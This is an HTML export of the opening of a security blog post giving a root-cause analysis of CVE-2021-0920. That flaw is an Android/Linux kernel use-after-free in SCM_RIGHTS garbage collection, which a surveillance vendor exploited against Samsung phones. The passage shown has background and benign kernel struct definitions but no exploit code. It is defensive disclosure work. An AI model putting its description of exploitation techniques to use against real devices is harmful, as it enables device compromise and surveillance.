"}ol.lst-kix_5yi4tofw6s0z-8.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-8 0}.lst-kix_zcvcgbx5ju56-5>li:before{content:"-  "}.lst-kix_zcvcgbx5ju56-3>li:before{content:"-  "}ol.lst-kix_5oipgjcxugcr-7.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-7 0}ul.lst-kix_1m9wqzg4mvqt-0{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-0.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-0 0}ol.lst-kix_mfudkcwv2w89-0{list-style-type:none}ol.lst-kix_mfudkcwv2w89-1{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-4{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-3{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-2{list-style-type:none}.lst-kix_5oipgjcxugcr-3>li{counter-increment:lst-ctn-kix_5oipgjcxugcr-3}ul.lst-kix_1m9wqzg4mvqt-1{list-style-type:none}.lst-kix_5yi4tofw6s0z-2>li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-2}.lst-kix_j5vmamheymgq-0>li{counter-increment:lst-ctn-kix_j5vmamheymgq-0}.lst-kix_f96hgc2s4b68-2>li:before{content:"-  "}.lst-kix_p4ttii5g8cnl-3>li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-3}.lst-kix_f96hgc2s4b68-7>li:before{content:"-  "}ol.lst-kix_5oipgjcxugcr-5.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-5 0}.lst-kix_7y90gfloiotx-2>li{counter-increment:lst-ctn-kix_7y90gfloiotx-2}.lst-kix_5yi4tofw6s0z-7>li:before{content:"" counter(lst-ctn-kix_5yi4tofw6s0z-7,lower-latin) ". "}.lst-kix_u3opzkdcnklc-5>li:before{content:"" counter(lst-ctn-kix_u3opzkdcnklc-5,lower-roman) ". "}ol.lst-kix_5yi4tofw6s0z-6.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-6 0}.lst-kix_u3opzkdcnklc-2>li:before{content:"" counter(lst-ctn-kix_u3opzkdcnklc-2,lower-roman) ". "}.lst-kix_5yi4tofw6s0z-4>li:before{content:"" counter(lst-ctn-kix_5yi4tofw6s0z-4,lower-latin) ". "}.lst-kix_51hgl6mwb3et-6>li{counter-increment:lst-ctn-kix_51hgl6mwb3et-6}ol.lst-kix_5yi4tofw6s0z-5.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-5 0}.lst-kix_5oipgjcxugcr-7>li{counter-increment:lst-ctn-kix_5oipgjcxugcr-7}ul.lst-kix_dqkfvt9lb2wy-2{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-3{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-4{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-5{list-style-type:none}ol.lst-kix_iptxq54yrrnf-2{list-style-type:none}ol.lst-kix_iptxq54yrrnf-1{list-style-type:none}ol.lst-kix_iptxq54yrrnf-0{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-0{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-1{list-style-type:none}ol.lst-kix_iptxq54yrrnf-6{list-style-type:none}ol.lst-kix_iptxq54yrrnf-5{list-style-type:none}ol.lst-kix_iptxq54yrrnf-4{list-style-type:none}ol.lst-kix_iptxq54yrrnf-3{list-style-type:none}ol.lst-kix_iptxq54yrrnf-8{list-style-type:none}ol.lst-kix_iptxq54yrrnf-7{list-style-type:none}.lst-kix_t1ae57uxlfl0-5>li:before{content:"-  "}ul.lst-kix_1m9wqzg4mvqt-8{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-7{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-6{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-5{list-style-type:none}.lst-kix_9prd8pa3o8y7-7>li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-7}.lst-kix_8mkn8rg9im4a-3>li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-3}ol.lst-kix_5oipgjcxugcr-4.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-4 0}.lst-kix_t1ae57uxlfl0-2>li:before{content:"-  "}ul.lst-kix_dqkfvt9lb2wy-6{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-7{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-8{list-style-type:none}.lst-kix_g3pd9wzbzpzz-5>li:before{content:"-  "}.lst-kix_aj3gpabmyk88-7>li:before{content:"-  "}ol.lst-kix_5oipgjcxugcr-4{list-style-type:none}ol.lst-kix_5oipgjcxugcr-3{list-style-type:none}.lst-kix_58ja23nrczhl-6>li:before{content:"" counter(lst-ctn-kix_58ja23nrczhl-6,decimal) ". "}ol.lst-kix_5oipgjcxugcr-2{list-style-type:none}ol.lst-kix_5oipgjcxugcr-3.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-3 0}ul.lst-kix_zcvcgbx5ju56-7{list-style-type:none}ol.lst-kix_5oipgjcxugcr-1{list-style-type:none}.lst-kix_yjo4cwnqbjp0-7>li:before{content:"-  "}ul.lst-kix_zcvcgbx5ju56-8{list-style-type:none}ol.lst-kix_5oipgjcxugcr-0{list-style-type:none}ol.lst-kix_5oipgjcxugcr-8{list-style-type:none}ol.lst-kix_5oipgjcxugcr-7{list-style-type:none}ol.lst-kix_5oipgjcxugcr-6{list-style-type:none}ol.lst-kix_5oipgjcxugcr-5{list-style-type:none}.lst-kix_whw4pjgxp3w1-7>li:before{content:"-  "}.lst-kix_58ja23nrczhl-7>li{counter-increment:lst-ctn-kix_58ja23nrczhl-7}.lst-kix_p4ttii5g8cnl-6>li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-6}.lst-kix_mfudkcwv2w89-8>li:before{content:"" counter(lst-ctn-kix_mfudkcwv2w89-8,lower-roman) ". "}.lst-kix_yn2ql2u2egdg-2>li:before{content:"-  "}.lst-kix_mfudkcwv2w89-0>li:before{content:"" counter(lst-ctn-kix_mfudkcwv2w89-0,decimal) ". "}.lst-kix_k47gmg94hbw2-4>li:before{content:"-  "}.lst-kix_dqkfvt9lb2wy-7>li:before{content:"-  "}ol.lst-kix_5oipgjcxugcr-1.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-1 0}ul.lst-kix_aj3gpabmyk88-6{list-style-type:none}.lst-kix_5oipgjcxugcr-4>li:before{content:"" counter(lst-ctn-kix_5oipgjcxugcr-4,lower-latin) ". "}ul.lst-kix_aj3gpabmyk88-7{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-2.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-2 0}ul.lst-kix_aj3gpabmyk88-8{list-style-type:none}.lst-kix_9gryrzygx46m-0>li:before{content:"-  "}.lst-kix_9gryrzygx46m-8>li:before{content:"-  "}.lst-kix_j5vmamheymgq-7>li{counter-increment:lst-ctn-kix_j5vmamheymgq-7}ul.lst-kix_aj3gpabmyk88-2{list-style-type:none}ul.lst-kix_aj3gpabmyk88-3{list-style-type:none}ul.lst-kix_aj3gpabmyk88-4{list-style-type:none}.lst-kix_iptxq54yrrnf-6>li:before{content:"" counter(lst-ctn-kix_iptxq54yrrnf-6,decimal) ". "}ul.lst-kix_aj3gpabmyk88-5{list-style-type:none}.lst-kix_3a2g7o19wgb3-1>li:before{content:"" counter(lst-ctn-kix_3a2g7o19wgb3-1,lower-latin) ". "}ul.lst-kix_aj3gpabmyk88-0{list-style-type:none}ul.lst-kix_aj3gpabmyk88-1{list-style-type:none}.lst-kix_u3opzkdcnklc-5>li{counter-increment:lst-ctn-kix_u3opzkdcnklc-5}.lst-kix_6l3lpr6ytz51-5>li:before{content:"-  "}ul.lst-kix_f96hgc2s4b68-0{list-style-type:none}.lst-kix_9prd8pa3o8y7-4>li:before{content:"" counter(lst-ctn-kix_9prd8pa3o8y7-4,lower-latin) ". "}ol.lst-kix_5oipgjcxugcr-0.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-0 0}ul.lst-kix_f96hgc2s4b68-2{list-style-type:none}ul.lst-kix_f96hgc2s4b68-1{list-style-type:none}ul.lst-kix_f96hgc2s4b68-4{list-style-type:none}ul.lst-kix_f96hgc2s4b68-3{list-style-type:none}ul.lst-kix_f96hgc2s4b68-6{list-style-type:none}ul.lst-kix_f96hgc2s4b68-5{list-style-type:none}ul.lst-kix_f96hgc2s4b68-8{list-style-type:none}ul.lst-kix_f96hgc2s4b68-7{list-style-type:none}.lst-kix_1m9wqzg4mvqt-5>li:before{content:"-  "}.lst-kix_7y90gfloiotx-6>li:before{content:"" counter(lst-ctn-kix_7y90gfloiotx-6,decimal) ". "}.lst-kix_8mkn8rg9im4a-1>li:before{content:"" counter(lst-ctn-kix_8mkn8rg9im4a-1,lower-latin) ". "}.lst-kix_zcvcgbx5ju56-0>li:before{content:"-  "}.lst-kix_zcvcgbx5ju56-8>li:before{content:"-  "}.lst-kix_j5vmamheymgq-2>li:before{content:"" counter(lst-ctn-kix_j5vmamheymgq-2,lower-roman) ". "}ol.lst-kix_mfudkcwv2w89-8{list-style-type:none}ol.lst-kix_mfudkcwv2w89-6{list-style-type:none}ol.lst-kix_mfudkcwv2w89-7{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-5{list-style-type:none}ol.lst-kix_mfudkcwv2w89-4{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-6{list-style-type:none}ol.lst-kix_mfudkcwv2w89-5{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-7{list-style-type:none}ol.lst-kix_mfudkcwv2w89-2{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-8{list-style-type:none}ol.lst-kix_mfudkcwv2w89-3{list-style-type:none}.lst-kix_yzib59bcdnhj-6>li:before{content:"-  "}ol.lst-kix_9prd8pa3o8y7-1{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-2{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-3{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-4{list-style-type:none}.lst-kix_h1p96gz9lzq4-6>li:before{content:"-  "}ol.lst-kix_5yi4tofw6s0z-1.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-1 0}ol.lst-kix_9prd8pa3o8y7-0{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.ykcrMYlEiJ-c18{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:540pt;border-top-color:#e0e0e0;border-bottom-style:solid}.ykcrMYlEiJ-c4{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:180pt;border-top-color:#000000;border-bottom-style:solid}.ykcrMYlEiJ-c24{padding-top:16pt;border-top-width:0pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;border-top-style:solid;background-color:#ffffff;border-bottom-width:0pt;border-bottom-style:solid;text-align:left}.ykcrMYlEiJ-c1{color:#1976d2;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.ykcrMYlEiJ-c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.ykcrMYlEiJ-c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.ykcrMYlEiJ-c30{padding-top:10pt;padding-bottom:10pt;line-height:1.0;page-break-after:avoid;text-align:left}.ykcrMYlEiJ-c6{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left;height:11pt}.ykcrMYlEiJ-c31{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.ykcrMYlEiJ-c36{color:#1976d2;font-weight:700;font-size:15pt;font-style:normal}.ykcrMYlEiJ-c33{border-spacing:0;border-collapse:collapse;margin-right:auto}.ykcrMYlEiJ-c35{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.ykcrMYlEiJ-c14{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.ykcrMYlEiJ-c0{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.ykcrMYlEiJ-c23{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.ykcrMYlEiJ-c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.ykcrMYlEiJ-c10{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.ykcrMYlEiJ-c22{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.ykcrMYlEiJ-c9{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.ykcrMYlEiJ-c43{color:#1976d2;font-size:12pt;font-family:"Raleway"}.ykcrMYlEiJ-c3{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.ykcrMYlEiJ-c8{font-family:"Times New Roman";font-style:italic;font-weight:400}.ykcrMYlEiJ-c50{text-decoration:none;vertical-align:baseline;font-family:"Times New Roman"}.ykcrMYlEiJ-c51{color:#424242;font-size:15pt;font-family:"Roboto"}.ykcrMYlEiJ-c11{vertical-align:sub;font-family:"Times New Roman";font-weight:400}.ykcrMYlEiJ-c34{text-decoration:none;vertical-align:baseline;font-family:"Arial"}.ykcrMYlEiJ-c13{text-decoration:none;vertical-align:baseline;font-style:normal}.ykcrMYlEiJ-c52{color:#666666;font-size:15pt}.ykcrMYlEiJ-c16{border:1px solid black;margin:5px}.ykcrMYlEiJ-c47{font-size:15pt;color:#1976d2}.ykcrMYlEiJ-c27{padding:0;margin:0}.ykcrMYlEiJ-c19{color:#000000;font-size:11pt}.ykcrMYlEiJ-c41{color:#1976d2;font-size:14pt}.ykcrMYlEiJ-c21{margin-left:72pt;padding-left:0pt}.ykcrMYlEiJ-c45{max-width:540pt;padding:36pt 36pt 36pt 36pt}.ykcrMYlEiJ-c32{font-weight:700;font-style:italic}.ykcrMYlEiJ-c20{orphans:2;widows:2}.ykcrMYlEiJ-c37{text-decoration:none;font-style:normal}.ykcrMYlEiJ-c15{font-weight:400;font-family:"Times New Roman"}.ykcrMYlEiJ-c44{font-weight:400;font-family:"Cambria Math"}.ykcrMYlEiJ-c25{margin-left:36pt;padding-left:0pt}.ykcrMYlEiJ-c26{color:inherit;text-decoration:inherit}.ykcrMYlEiJ-c49{font-weight:400}.ykcrMYlEiJ-c7{background-color:#ffff00}.ykcrMYlEiJ-c29{height:11pt}.ykcrMYlEiJ-c28{background-color:#ffffff}.ykcrMYlEiJ-c40{vertical-align:sub}.ykcrMYlEiJ-c42{font-style:normal}.ykcrMYlEiJ-c38{font-style:italic}.ykcrMYlEiJ-c46{height:23.9pt}.ykcrMYlEiJ-c48{margin-left:36pt}.ykcrMYlEiJ-c39{font-weight:700}.ykcrMYlEiJ-c17{height:0pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:10pt;color:#1976d2;font-weight:700;font-size:15pt;padding-bottom:10pt;font-family:"Arial";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:10pt;color:#1976d2;font-size:14pt;padding-bottom:10pt;font-family:"Arial";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c28 c45 doc-content">
 <p class="c20 c24 subtitle" id="h.y3ub1og6t2w0"><span class="c34 c49 c42 c52">A deep dive into an in-the-wild Android exploit</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Guest Post by Xingyu Jin, Android Security Research<br><br></span><span>This is part one of a two-part guest blog post, where first we&#39;ll look at the <span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-0920.html">root cause</a></span> of the CVE-2021-0920 vulnerability. In the second post, we&#39;ll dive </span><span>into the in</span><span>-</span><span>the</span><span>-wild 0-day exploitation of the vulnerability and post-compromise modules.</span></p><h1 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.ki897ei81q67"><span>Overview of in-the-wild CVE-2021-0920 exploits</span></h1>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>A surveillance vendor </span><span>named Wintego</span><span>&nbsp;has developed an exploit for Linux socket syscall 0-day, CVE-2021-0920, and used it in the wild since </span><span>at least November 2020 based on the earliest captured sample</span><span>, until the issue was fixed in November 2021. &nbsp;Combined with Chrome and Samsung browser </span><span>exploits</span><span>, the vendor was able to remotely root Samsung devices. The fix was released with the </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://source.android.com/security/bulletin/2021-11-01">November 2021 Android Security Bulletin</a></span><span class="ykcrMYlEiJ-c2">, and applied to Samsung devices in Samsung&#39;s December 2021 security update.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Google&#39;s Threat Analysis Group (TAG) discovered Samsung browser exploit chains being used in the wild. TAG then performed root cause analysis and discovered that this vulnerability, CVE-2021-0920, was being used to escape the sandbox and elevate privileges. </span><span>CVE-2021-0920 was reported to Linux/Android anonymously. The Google Android Security Team performed</span><span>&nbsp;the full deep-dive analysis of the exploit.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>This issue was initially discovered in 2016 by a RedHat kernel developer and disclosed in a public email thread, but the Linux kernel community </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://patchwork.ozlabs.org/project/netdev/patch/CAOssrKcfncAYsQWkfLGFgoOxAQJVT2hYVWdBA6Cw7hhO8RJ_wQ@mail.gmail.com/">did not patch</a></span><span class="ykcrMYlEiJ-c2">&nbsp;the issue until it was re-reported in 2021.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Various Samsung devices were targeted, including the Samsung S10 and S20. By abusing an ephemeral race condition in Linux kernel garbage collection, the exploit code was able to obtain a use-after-free (UAF) in a kernel </span><span class="ykcrMYlEiJ-c3">sk_buff</span><span>&nbsp;object. The in-the-wild sample could effectively circumvent </span><span class="ykcrMYlEiJ-c3">CONFIG_ARM64_UAO</span><span>, achieve arbitrary read / write primitives and bypass Samsung RKP to elevate to root.</span><span>&nbsp;Other Android devices</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c2">were also vulnerable, but we did not find any exploit samples against them.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">Text extracted from captured samples dubbed the vulnerability &ldquo;quantum Linux kernel garbage collection&rdquo;, which appears to be a fitting title for this blogpost.</span></p><h1 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.q8pevpc2sw6u"><span class="ykcrMYlEiJ-c36 ykcrMYlEiJ-c34">Introduction</span></h1>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>CVE-2021-0920 is a use-after-free (UAF) due to a race condition in the garbage collection system for </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>. </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>&nbsp;is a control message that allows unix-domain sockets to transmit an open file descriptor from one process to another. In other words, the sender transmits a file descriptor and the receiver then obtains a file descriptor from the sender. This passing of file descriptors adds complexity to reference-counting file structs. To account for this, the Linux kernel community designed a special garbage collection system. CVE-2021-0920 is a vulnerability within this garbage collection system. By winning a race condition during the garbage collection process, an adversary can exploit the UAF on the socket buffer, </span><span class="ykcrMYlEiJ-c3">sk_buff</span><span>&nbsp;object. In the following sections, we&rsquo;ll explain the </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>&nbsp;garbage collection system and the details of the vulnerability. The analysis is based on the Linux 4.14 kernel.</span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.qjne51ghywhs"><span>What is SCM_RIGHTS</span><span class="ykcrMYlEiJ-c1">?</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Linux developers can share file descriptors (fd) from one process to another using the </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://man7.org/linux/man-pages/man7/unix.7.html">SCM_RIGHTS datagram with the sendmsg syscall</a></span><span>. When a process passes a file descriptor to another process, </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>&nbsp;will add a reference to the underlying </span><span class="ykcrMYlEiJ-c3">file</span><span>&nbsp;struct. This means that the process that is sending the file descriptors can immediately close the file descriptor on their end, even if the receiving process has not yet accepted and taken ownership of the file descriptors. When the file descriptors are in the &ldquo;queued&rdquo; state (meaning the sender has passed the fd and then closed it, but the receiver has not yet accepted the fd and taken ownership), specialized garbage collection is needed. To track this &ldquo;queued&rdquo; state, this </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://lwn.net/Articles/779472/">LWN article</a></span><span>&nbsp;does a great job explaining </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span class="ykcrMYlEiJ-c2">&nbsp;reference counting, and it&#39;s recommended reading before continuing on with this blogpost.</span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.4irl9u2c0bda"><span class="ykcrMYlEiJ-c1">Sending</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>As stated previously, a unix domain socket uses the syscall </span><span class="ykcrMYlEiJ-c3">sendmsg</span><span>&nbsp;to send a file descriptor to another socket. To explain the reference counting that occurs during </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>, </span><span>we&rsquo;ll start from the sender&rsquo;s point of view. We start with the kernel</span><span>&nbsp;function </span><span class="ykcrMYlEiJ-c3">unix_stream_sendmsg</span><span>, which implements the </span><span class="ykcrMYlEiJ-c3">sendmsg</span><span>&nbsp;syscall. </span><span>To implement the </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>&nbsp;functionality, the kernel uses the structure </span><span class="ykcrMYlEiJ-c3">scm_fp_list</span><span>&nbsp;for managing all the transmitted </span><span class="ykcrMYlEiJ-c3">file</span><span>&nbsp;structures. </span><span class="ykcrMYlEiJ-c3">scm_fp_list</span><span>&nbsp;stores the list of </span><span class="ykcrMYlEiJ-c3">file</span><span class="ykcrMYlEiJ-c2">&nbsp;pointers to be passed. </span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.c96392c69342188701600f62dd8e18978b65546f"></a><a id="t.0"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_fp_list </span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">short</span><span class="ykcrMYlEiJ-c0">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; count</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">short</span><span class="ykcrMYlEiJ-c0">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; max</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;user_struct &nbsp; &nbsp; &nbsp;</span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">user</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;file &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">[</span><span class="ykcrMYlEiJ-c0">SCM_MAX_FD</span><span class="ykcrMYlEiJ-c10">];</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">};</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c3">unix_stream_sendmsg</span><span>&nbsp;invokes </span><span class="ykcrMYlEiJ-c3">scm_send</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L1886">af_unix.c#L1886</a></span><span>) to initialize the </span><span class="ykcrMYlEiJ-c3">scm_fp_list</span><span>&nbsp;structure, linked by the</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c3">scm_cookie</span><span>&nbsp;structure on the stack.</span></p><a id="t.15e3db5d013417d6ac8097f3ef1d76367028ae48"></a><a id="t.1"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_cookie </span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;pid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">pid</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c23">/* Skb credentials */</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14 ykcrMYlEiJ-c7">struct</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;scm_fp_list &nbsp; &nbsp; &nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">*</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="ykcrMYlEiJ-c23 ykcrMYlEiJ-c7">/* Passed files &nbsp; &nbsp; &nbsp; &nbsp; */</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_creds &nbsp; &nbsp; &nbsp; &nbsp;creds</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="ykcrMYlEiJ-c23">/* Skb credentials &nbsp; &nbsp; &nbsp;*/</span></p>
